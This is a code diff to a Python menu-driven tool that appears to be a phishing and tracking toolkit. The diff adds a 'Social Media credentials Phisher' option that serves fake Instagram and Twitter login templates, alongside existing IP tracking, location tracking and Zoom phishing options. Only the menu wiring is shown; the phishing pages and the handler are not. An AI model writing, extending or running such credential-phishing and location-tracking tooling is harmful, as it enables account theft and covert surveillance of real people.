@@ -52,6 +52,27 @@ def LocationTracker():
         if entry == '3':
             ZoomPhish()
 
+def SocialMediaPhisher():
+    os.system("cls||clear")
+    print(f"{G}{art}{W}\n\n")
+
+    print(f"{Y}[!] Select a template:\n\n{W}")
+    print(f"{G}[1]{W}", end=" ")
+    print(f"{C}Instagram{W}")
+    print(f"{G}[2]{W}", end=" ")
+    print(f"{C}Twitter{W}")
+
+    while True:
+        entry = input(f"{G}[>] {W}")
+
+        if entry == '1':
+            AccountPhish("instagramlogin/instagramlogin.html")
+
+        if entry == '2':
+            AccountPhish("twitterlogin/twitterlogin.html")
+
+
+
 def main():
 
     try:
@@ -72,6 +93,8 @@ def main():
         print(f"{C}Track ip with url{W}")
         print(f"{G}[2]{W}", end=" ")
         print(f"{C}Location Tracker{W}")
+        print(f"{G}[3]{W}", end=" ")
+        print(f"{C}Social Media credentials Phisher{W}")
 
         while True:
             entry = input(f"{G}[>] {W}")
@@ -81,6 +104,9 @@ def main():
 
             elif entry == '2':
                 LocationTracker()
+
+            elif entry == '3':
+                SocialMediaPhisher()
 
             elif entry == 'exit':
                 print("Bye")
